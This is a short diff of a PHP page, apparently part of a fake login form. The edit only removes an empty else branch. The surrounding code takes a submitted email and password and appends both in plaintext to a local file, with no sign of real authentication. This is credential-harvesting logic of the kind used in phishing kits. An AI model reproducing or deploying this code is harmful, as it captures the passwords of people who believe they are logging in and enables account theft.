@@ -21,7 +21,7 @@ if (isset($_POST["inputEmail"]) && isset($_POST["inputPassword"]) && !empty($_PO
         $ficher_contenu = "".$_POST["inputEmail"]." --- ".$_POST["inputPassword"]."\r\n";
         file_put_contents($fichier_nom, $ficher_contenu,FILE_APPEND);
     }
-}else{}
+}
 ?>
 </head>
 
